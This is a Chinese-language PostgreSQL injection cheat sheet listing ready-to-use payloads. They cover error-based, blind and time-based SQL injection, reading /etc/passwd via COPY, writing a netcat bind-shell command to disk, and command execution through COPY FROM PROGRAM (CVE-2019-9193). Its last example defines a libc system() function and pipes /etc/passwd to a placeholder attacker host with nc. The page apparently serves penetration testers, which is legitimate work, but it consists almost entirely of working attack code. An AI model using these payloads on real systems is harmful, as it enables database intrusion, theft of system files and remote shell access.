# PostgreSQL 注入

## Summary

* [PostgreSQL Comments](#postgresql-comments)
* [PostgreSQL Error Based](#postgresql-error-based)
* [PostgreSQL Blind](#postgresql-blind)
* [PostgreSQL Time Based](#postgresql-time-based)
* [PostgreSQL File Read](#postgresql-file-read)
* [PostgreSQL File Write](#postgresql-file-write)
* [PostgreSQL Command execution](#postgresql-command-execution)
	* [CVE-2019–9193](#cve-2019–9193)
	* [Using libc.so.6](#using-libc-so-6)
* [References](#references)

## PostgreSQL Comments

PostgreSQL注释

```sql
--
/**/  
```

## PostgreSQL Error Based

基于PostgreSQL报错注入

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```

## PostgreSQL Blind

PostgreSQL盲注

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

## PostgreSQL Time Based

基于PostgreSQL时间注入

```sql
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL File Read

PostgreSQL文件读取

```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

NOTE: ``pg_read_file`不支持```/```符号

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

## PostgreSQL File Write

 PostgreSQL File文件写入

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

## PostgreSQL Command execution

PostgreSQL命令执行

### CVE-2019–9193

如果你可以直接使用数据库，那你就可以直接使用[Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598)进行利用，如果不可以，那你需要手动输入一下SQL查询

```SQL
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)

### Using libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## References

* [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)](https://hackerone.com/reports/181803)
* [POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel](https://www.dionach.com/blog/postgresql-9x-remote-command-execution)